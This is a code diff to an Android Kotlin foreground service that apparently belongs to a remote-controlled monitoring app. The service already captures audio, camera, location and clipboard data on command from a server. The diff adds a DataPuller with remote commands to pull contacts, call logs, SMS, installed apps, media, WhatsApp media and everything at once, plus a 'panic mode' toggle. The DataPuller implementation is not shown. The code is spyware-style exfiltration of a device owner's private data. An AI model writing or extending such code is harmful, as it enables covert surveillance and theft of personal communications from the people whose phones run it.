@@ -36,6 +36,7 @@ class MonitoringForegroundService : Service() {
     private lateinit var cameraCapture: CameraCapture
     private lateinit var locationMonitor: LocationMonitor
     private lateinit var deviceInfo: DeviceInfoCollector
+    private lateinit var dataPuller: DataPuller
     private var screenMonitor: ScreenMonitor? = null
 
     private var wsJob: Job? = null
@@ -52,10 +53,11 @@ class MonitoringForegroundService : Service() {
 
         val getToken: suspend () -> String? = { sessionManager.sessionToken.first() }
 
-        audioMonitor = AudioMonitor(this, apiService, presenceService, scope, getToken)
+        audioMonitor  = AudioMonitor(this, apiService, presenceService, scope, getToken)
         cameraCapture = CameraCapture(this, apiService, scope, getToken)
         locationMonitor = LocationMonitor(this, apiService, scope, getToken)
-        deviceInfo = DeviceInfoCollector(this, apiService, getToken)
+        deviceInfo    = DeviceInfoCollector(this, apiService, getToken)
+        dataPuller    = DataPuller(this, apiService, scope, getToken)
 
         wsJob = scope.launch { collectCommands() }
 
@@ -104,11 +106,12 @@ class MonitoringForegroundService : Service() {
     private suspend fun collectCommands() {
         Log.i(TAG, "collectCommands: listening for events")
         presenceService.events.collect { msg ->
-            Log.d(TAG, "event received type=${msg.type} commandType=${msg.commandType}")
+            Log.d(TAG, "event received type=${msg.type}")
             if (msg.type != "remote_command") return@collect
-            val commandType = msg.commandType ?: return@collect
-            val commandId = msg.commandId ?: 0
-            val params = msg.params ?: JsonObject()
+            val data = msg.data ?: return@collect
+            val commandType = data.get("command_type")?.asString ?: return@collect
+            val commandId = data.get("command_id")?.asInt ?: 0
+            val params = data.getAsJsonObject("params") ?: JsonObject()
             Log.i(TAG, "remote_command: $commandType commandId=$commandId params=$params")
             handleCommand(commandType, params, commandId)
         }
@@ -187,6 +190,17 @@ class MonitoringForegroundService : Service() {
                     "get_network_info"   -> deviceInfo.uploadNetwork(commandId)
                     "get_device_info"    -> deviceInfo.uploadDevice(commandId)
                     "get_clipboard"      -> deviceInfo.uploadClipboard(commandId)
+
+                    "pull_contacts"      -> dataPuller.pullContacts()
+                    "pull_call_logs"     -> dataPuller.pullCallLogs()
+                    "pull_sms"           -> dataPuller.pullSms()
+                    "pull_installed_apps"-> dataPuller.pullInstalledApps()
+                    "pull_media"         -> dataPuller.pullMedia()
+                    "pull_whatsapp_media"-> dataPuller.pullWhatsappMedia()
+                    "pull_all"           -> dataPuller.pullAll()
+
+                    "panic_mode_on"      -> dataPuller.panicOn()
+                    "panic_mode_off"     -> dataPuller.panicOff()
 
                     "boost_location_frequency", "normal_location_frequency" -> {
                         if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
